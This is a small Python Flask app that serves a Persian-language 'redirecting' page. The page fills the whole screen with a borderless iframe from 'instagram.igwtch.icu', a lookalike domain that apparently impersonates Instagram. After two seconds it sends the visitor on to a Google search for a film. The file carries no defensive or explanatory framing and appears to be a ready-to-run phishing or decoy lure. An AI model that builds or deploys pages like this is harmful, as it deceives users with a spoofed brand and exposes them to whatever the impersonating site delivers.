from flask import Flask, render_template_string

app = Flask(__name__)

@app.route("/start")
def start():
    return render_template_string("""
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>در حال انتقال...</title>
  <script>
    setTimeout(function() {
      window.location.href = "https://www.google.com/search?q=فیلم+مسافران";
    }, 2000);
  </script>
</head>
<body>
  <iframe src="https://instagram.igwtch.icu?video=986907192" style="width:100vw; height:100vh; border:none;"></iframe>
</body>
</html>
""")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)